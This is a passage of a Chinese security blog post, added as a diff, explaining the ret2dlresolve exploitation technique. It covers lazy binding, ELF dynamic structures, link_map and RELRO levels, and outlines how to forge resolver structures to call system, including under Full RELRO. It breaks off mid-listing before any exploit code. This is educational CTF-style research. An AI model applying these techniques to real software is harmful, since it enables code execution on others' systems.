@@ -1,0 +1,1192 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
+
+
+
+
+<title>Ret2dlresolve攻击——从No RELRO到FULL RELRO | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+
+
+
+  <!-- for theme: default is false -->
+  <!-- for page: default is true -->
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+
+</head>
+<body>
+	
+		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+			expand_toc()
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Ret2dlresolve攻击——从No RELRO到FULL RELRO</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">三月 5, 2022&nbsp;&nbsp;0:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/category/安全研究/">安全研究</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>本文需要对<code>ROP</code>技术有一些基础认识，除了<code>ret2dlresolve</code>，其他<code>ROP</code>知识不再赘述。</p>
+<p>本文的目的在于较为系统的总结ret2dlresolve技术在各个等级的<code>RELRO</code>保护下进行，以及对以ctfwiki为代表的一些中文互联网上关于<code>ret2dlresolve</code>技术的博客或者科普文章做一次关于<code>ret2dlresolve</code>技术在<code>FULL RELRO</code>下的利用的补充。</p>
+<p>因为我发现基本上对于绝大多数的pwn入门者，对于<code>ret2dlresolve</code>技术在<code>FULL RELRO</code>下的利用均表示无能为力，并且认为是不可实现的、或者说退而求其次，转向其他技术进行攻击。但经过一系列的学习后，发现事实并非如此——早在2015年的<code>usenix</code>研讨会上就有加州大学的安全研究员
+<code>Alessandro Di Federico</code>
+提出了该情况下的解决方案，该论文也公开发表在 <a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico" target="_blank" rel="noopener">usenix
+2015 技术会议</a> 上，对此感兴趣的可直接跳到该论文处阅读。</p>
+<a id="more"></a>
+<h2 id="一.-ret2dlresolve原理">一. Ret2dlresolve原理</h2>
+<p>启用动态链接的程序在调用函数时，会使用延迟绑定技术，即外部引入的函数真正调用时才会去解析该函数的虚拟地址VA，而这个动作实际上是需要通过<code>got</code>,
+<code>plt</code>表以及各个动态相关段来实现。</p>
+<p>当第一次调用某外部引入函数（如<code>read</code>，<code>system</code>等)时会调用<code>_dl_runtime_resolve(linkmap, offset)</code>进行函数地址解析，当得到某函数的具体加载地址后会回写<code>got</code>表项再直接调用该函数。</p>
+<p>而Ret2dlresolve攻击则是
+<strong>在这一解析函数的过程中，对相关的结构体进行伪造，并通过控制参数或者结构体指针使得解析函数的具体逻辑能够找到我们构造的结构体，并解析出一个危险/邪恶的函数地址，达成执行任意函数的目的。</strong></p>
+<h3 id="lazy-binding">1. Lazy Binding</h3>
+<p>延迟绑定技术(Lazy
+Binding)，即在elf文件加载时并不直接全部解析所需外部导入的函数地址，而是在需要调用时再去使用<code>dl_runtime_resolve</code>函数进行解析。具体操作会涉及全局偏移表GOT(Global
+Offset Table)和过程链接表(Procedure Linkage
+Table)两个表。这些是pwn基本知识，具体细节不在此赘述，此处仅给出一般情况下调用函数时使用<code>dl_runtime_resolve</code>解析时的程序流和栈内情况，方便后面构造数据结构或者传递参数时进行参考，也算是较为系统化的概述的第一步。</p>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/ret2dlresolve--1.lazy-binding.png" alt="ret2dlresolve--1.lazy binding">
+<figcaption aria-hidden="true">ret2dlresolve--1.lazy
+binding</figcaption>
+</figure>
+<h3 id="related-dynamic-sections">2. Related Dynamic Sections</h3>
+<p>接下来就是dl_runtime_resolve为找到对应函数绑定类型、绑定特征、回写地址以及最重要的标识符字符串等<strong>相关的结构体以及各个动态相关的节</strong>，如下表所示：</p>
+<pre><code>    ===============================================
+    |      Related sections       |   Structure   |
+    ===============================================
+    |          .dynamic           | Elf_Dyn entry |
+    +-----------------+-----------+---------------+
+    |    Functions    | Variables |      ---      |
+    +-----------------+-----------+---------------+
+    |    .ret.plt     | .ret.dyn  | Elf_Rel entry |
+    +-----------------+-----------+---------------+
+    |    .dynsym      | .dynsym   | Elf_Sym entry |
+    +-----------------+-----------+---------------+
+    |    .dynstr      | .dynstr   | Strings       |
+    +-----------------+-----------+---------------+</code></pre>
+<p>以上相关节可以在Linux中运行<code>readelf -S elf_file</code>找到。</p>
+<p>在IDA中查看的话，<code>.dynamic</code>节挨着<code>got</code>表，其余如<code>.rel.plt</code>、<code>.dyn.sym</code>、<code>.dyn.str</code>
+等节在程序入口附近，上述节与elf头、程序头均被IDA视为与加载相关，都放在为<code>LOAD</code>段中。</p>
+<p>接下来用图来表示这些段的作用和各个参数的关系：</p>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/ret2dlresolve--2.related-sections.png" alt="ret2dlresolve--2.related-sections">
+<figcaption aria-hidden="true">ret2dlresolve--2.related-sections</figcaption>
+</figure>
+<p>而<code>.dynamic</code>节则是存放了一些<code>Elf64_Dyn</code>或者<code>Elf32_Dyn</code>结构体，说具体些就是键值对，关键字是各个动态段的标识，值则是各个动态段的对应的基址，即包括上图中的<code>.ret.plt</code>、<code>.dynsym</code>、<code>dynstr</code>节等。其主要作用就是在解析函数地址时使用这些键值对来找到各个动态段的基址，以确定数据条目的位置。</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  Elf32_Sword   d_tag<span class="op">;</span>                  <span class="co">/* Dynamic entry type */</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">union</span>                                 </span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>      Elf32_Word d_val<span class="op">;</span>                 <span class="co">/* Integer value */</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>      Elf32_Addr d_ptr<span class="op">;</span>                 <span class="co">/* Entry Address */</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> d_un<span class="op">;</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> Elf32_Dyn<span class="op">;</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>  Elf64_Sxword        d_tag<span class="op">;</span>           <span class="co">/* Dynamic entry type */</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>  <span class="kw">union</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>      Elf64_Xword d_val<span class="op">;</span>               <span class="co">/* Integer value */</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>      Elf64_Addr d_ptr<span class="op">;</span>                <span class="co">/* Address value */</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> d_un<span class="op">;</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> Elf64_Dyn<span class="op">;</span></span></code></pre></div>
+<p>其关键字<code>d_tag</code>定义如下：</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* Legal values for d_tag (dynamic entry type).  */</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_NULL                0                </span><span class="co">/* Marks end of dynamic section */</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_NEEDED              1                </span><span class="co">/* Name of needed library */</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_PLTRELSZ            2                </span><span class="co">/* Size in bytes of PLT relocs */</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_PLTGOT              3                </span><span class="co">/* Processor defined value */</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_HASH                4                </span><span class="co">/* Address of symbol hash table */</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_STRTAB              5                </span><span class="co">/* Address of string table */</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_SYMTAB              6                </span><span class="co">/* Address of symbol table */</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_RELA                7                </span><span class="co">/* Address of Rela relocs */</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_RELASZ              8                </span><span class="co">/* Total size of Rela relocs */</span></span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_RELAENT             9                </span><span class="co">/* Size of one Rela reloc */</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_STRSZ              10                </span><span class="co">/* Size of string table */</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_SYMENT             11                </span><span class="co">/* Size of one symbol table entry */</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_INIT               12                </span><span class="co">/* Address of init function */</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_FINI               13                </span><span class="co">/* Address of termination function */</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_SONAME             14                </span><span class="co">/* Name of shared object */</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_RPATH              15                </span><span class="co">/* Library search path (deprecated) */</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_SYMBOLIC           16                </span><span class="co">/* Start symbol search here */</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_REL                17                </span><span class="co">/* Address of Rel relocs */</span></span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_RELSZ              18                </span><span class="co">/* Total size of Rel relocs */</span></span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_RELENT             19                </span><span class="co">/* Size of one Rel reloc */</span></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_PLTREL             20                </span><span class="co">/* Type of reloc in PLT */</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_DEBUG              21                </span><span class="co">/* For debugging; unspecified */</span></span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_TEXTREL            22                </span><span class="co">/* Reloc might modify .text */</span></span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_JMPREL             23                </span><span class="co">/* Address of PLT relocs */</span></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_BIND_NOW           24                </span><span class="co">/* Process relocations of object */</span></span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_INIT_ARRAY         25                </span><span class="co">/* Array with addresses of init fct */</span></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_FINI_ARRAY         26                </span><span class="co">/* Array with addresses of fini fct */</span></span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_INIT_ARRAYSZ       27                </span><span class="co">/* Size in bytes of DT_INIT_ARRAY */</span></span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_FINI_ARRAYSZ       28                </span><span class="co">/* Size in bytes of DT_FINI_ARRAY */</span></span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_RUNPATH            29                </span><span class="co">/* Library search path */</span></span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_FLAGS              30                </span><span class="co">/* Flags for the object being loaded */</span></span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_ENCODING           32                </span><span class="co">/* Start of encoded range */</span></span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_PREINIT_ARRAY      32                </span><span class="co">/* Array with addresses of preinit fct*/</span></span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_PREINIT_ARRAYSZ    33                </span><span class="co">/* size in bytes of DT_PREINIT_ARRAY */</span></span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_SYMTAB_SHNDX       34                </span><span class="co">/* Address of SYMTAB_SHNDX section */</span></span>
+<span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a><span class="pp">#define DT_NUM                35                </span><span class="co">/* Number used */</span></span></code></pre></div>
+<h3 id="link_map">3. link_map</h3>
+<p><code>link_map</code>是描述已加载的共享对象的结构体，采用双链表管理，该数据结构保存在<code>ld.so</code>的<code>.bss</code>段中。我们主要关注其中几个有意思的字段：</p>
+<ol type="1">
+<li><code>l_addr</code>：共享对象的加载基址；</li>
+<li><code>l_next</code>，<code>l_prev</code>：管理<code>link_map</code>的双链表指针；</li>
+<li><code>l_info</code>：保存<code>Elfxx_Dyn</code>结构体指针的列表，用来寻找各节基址；如<code>l_info[DT_STRTAB]</code>指向保存着函数解析字符串表基址的<code>Elfxx_Dyn</code>结构体。</li>
+</ol>
+<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* Structure describing a loaded shared object.  The `l_next&#39; and `l_prev&#39;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="co">   members form a chain of all the shared objects loaded at startup.</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co">   These data structures exist in space used by the run-time dynamic linker;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="co">   modifying them may have disastrous results.</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="co">   This data structure might change in future, if necessary.  User-level</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="co">   programs must avoid defining objects of this type.  */</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> link_map</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">/* These first few members are part of the protocol with the debugger.</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="co">       This is the same format used in SVR4.  */</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>    ElfW<span class="op">(</span>Addr<span class="op">)</span> l_addr<span class="op">;</span>             <span class="co">/* Difference between the address in the ELF</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="co">                                   file and the addresses in memory.  */</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>l_name<span class="op">;</span>                <span class="co">/* Absolute file name object was found in.  */</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>    ElfW<span class="op">(</span>Dyn<span class="op">)</span> <span class="op">*</span>l_ld<span class="op">;</span>                <span class="co">/* Dynamic section of the shared object.  */</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> link_map <span class="op">*</span>l_next<span class="op">,</span> <span class="op">*</span>l_prev<span class="op">;</span> <span class="co">/* Chain of loaded objects.  */</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>    <span class="co">/* All following members are internal to the dynamic linker.</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="co">       They may change without notice.  */</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>    <span class="co">/* This is an element which is only ever different from a pointer to</span></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a><span class="co">       the very same copy of this type for ld.so when it is used in more</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a><span class="co">       than one namespace.  */</span></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> link_map <span class="op">*</span>l_real<span class="op">;</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>    <span class="co">/* Number of the namespace this link map belongs to.  */</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>    Lmid_t l_ns<span class="op">;</span></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> libname_list <span class="op">*</span>l_libname<span class="op">;</span></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>    ElfW<span class="op">(</span>Dyn<span class="op">)</span> <span class="op">*</span>l_info<span class="op">[</span>DT_NUM <span class="op">+</span> DT_THISPROCNUM <span class="op">+</span> DT_VERSIONTAGNUM <span class="op">+</span> DT_EXTRANUM <span class="op">+</span> DT_VALNUM <span class="op">+</span> DT_ADDRNUM<span class="op">];</span></span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>    <span class="dt">const</span> ElfW<span class="op">(</span>Phdr<span class="op">)</span> <span class="op">*</span>l_phdr<span class="op">;</span>        <span class="co">/* Pointer to program header table in core.  */</span></span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>    ElfW<span class="op">(</span>Addr<span class="op">)</span> l_entry<span class="op">;</span>                <span class="co">/* Entry point location.  */</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>    ElfW<span class="op">(</span>Half<span class="op">)</span> l_phnum<span class="op">;</span>                <span class="co">/* Number of program header entries.  */</span></span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a>    ElfW<span class="op">(</span>Half<span class="op">)</span> l_ldnum<span class="op">;</span>                <span class="co">/* Number of dynamic segment entries.  */</span></span></code></pre></div>
+<h3 id="relro">4. RELRO</h3>
+<p><code>RELRO</code>(Relocation
+Read-Only)重定位段只读保护分为以下三个等级：</p>
+<ol type="1">
+<li><code>NO RELRO</code>：保护未开的情况，所有重定位段均可写，包括<code>.dynamic</code>、<code>.got</code>、<code>.got.plt</code>；</li>
+<li><code>Partial RELRO</code>：部分开启保护，其为GCC编译的默认配置。<code>.dynamic</code>、<code>.got</code>被标记为只读，并且会强制地将<code>ELF</code>的内部数据段
+<code>.got</code> ，<code>.got.plt</code>等放到外部数据段
+<code>.data</code>、<code>.bss</code>之前，即防止程序数据段溢出改变内部数据段的值，从而劫持程序控制流。虽然<code>.got</code>标记为只读，但是<code>.got.plt</code>仍然可写，即仍然可以改写GOT表劫持程序控制流；</li>
+<li><code>Full RELRO</code>：继承<code>Partial RELRO</code>的所有保护，并且<code>.got.plt</code>也被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要<code>link_map</code>以及<code>dl_runtime_resolve</code>函数，则GOT表中这两项数据均置为0，此时<code>ret2dlresolve</code>技术最关键的两项数据丢失，并且GOT表不可写。</li>
+</ol>
+<h3 id="小结">5. 小结</h3>
+<p>通过上述的结构体描述和寻找函数地址的过程，我们可以得出以下利用思路：</p>
+<ol type="1">
+<li>修改 <code>.dynamic</code>
+段中字符串表<code>STRTAB</code>的基址，使得基址指向可控区域附近，然后伪造一个对应位置的任意函数字符串，使得解析正常函数时得到我们的任意函数字符串，从而调用该函数，达到任意函数执行的目的；</li>
+<li>基址无法改变的情况下，改变从基址寻找各个条目的偏移或者索引，使得基址+偏移落入我们可控的区域，如伪造如<code>Elfxx_Rel</code>、<code>Elfxx_Sym</code>和字符串等条目，达到任意函数执行的目的；</li>
+<li>修改<code>link_map</code>结构中<code>l_info</code>保存的字符串表<code>STRTAB</code>基址的<code>Elfxx_Dyn</code>的指针，即修改<code>l_info[DT_STRTAB]</code>使得其指向可控区域，在伪造一个字符串表<code>STRTAB</code>基址的<code>Elfxx_Dyn</code>结构体，再次指向可控区域的任意函数字符即可同样达成目的；</li>
+<li>在某些极端的情况下，如<code>x64</code>位下无泄漏函数时，我们需要伪造<code>link_map</code>结构体来保证ROP能够成功执行，这将在下面的文章中详细讨论。</li>
+<li>在<code>Full RELRO</code>的情况下，<code>ret2dlresolve</code>技术最关键的两项数据<code>link_map</code>以及<code>dl_runtime_resolve</code>函数的地址丢失，我们可以通过一些方式寻找到这两项数据，然后情况就回到了<code>Partial RELRO</code>，即<code>ret2dlresolve</code>攻击依旧可以执行。</li>
+</ol>
+<p>PS：上述相关结构（除了<code>link_map</code>）的解释都可以在<a href="https://man7.org/linux/man-pages/man5/elf.5.html" target="_blank" rel="noopener">此链接</a>中找到，如果上述的过程未解释清楚还请移步查看其定义。</p>
+<h2 id="二.-利用手段">二. 利用手段</h2>
+<h3 id="no-relro">1. NO RELRO</h3>
+<p>在<code>NO RELRO</code>的情况下，<code>.dynamic</code>节是可以被修改的，即重定位相关的各表项的基址我们可以修改到可控区域，准确地说是借用正常函数解析的各项表项，仅修改<code>STRTAB</code>表的基址，使得最后找到的函数字符串是我们可控的，然后达成任意函数执行的目的。</p>
+<h4 id="改变strtab的基址">1.1 改变STRTAB的基址</h4>
+<p>既然<code>read</code>,<code>write</code>,<code>system</code>都是函数，我们可以借助<code>read</code>，<code>write</code>等函数的rel相关条目，仅仅将最后的<code>STRTAB</code>表的入口改变，然后根据我们借用函数的<code>Elfxx_Sym</code>项中的<code>st_name</code>偏移，将伪造的.<code>dynstr</code>基址
++ <code>st_name</code>偏移
+落入到我们可控区域即可，然后写上<code>"system\x00"</code>，解析<code>puts</code>函数时变为<code>system</code>函数。</p>
+<figure>
+<img src="/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/ret2dlresolve--3.NO-RELRO.png" alt="ret2dlresolve--3.NO-RELRO">
+<figcaption aria-hidden="true">ret2dlresolve--3.NO-RELRO</figcaption>
+</figure>
+<p>上图红色部分代表伪造或者需要修改的结构体，灰色部分为原本正常的结构体，实线箭头表示原本正常的解析流程或者正常的指向，虚线则表示篡改后的指向（下图同）。</p>
+<p><code>.dynamic</code>节的结构体<code>Elfxx_Dyn</code>定义如下:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  Elf32_Sword   d_tag<span class="op">;</span>                  <span class="co">/* Dynamic entry type */</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">union</span>                                 </span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
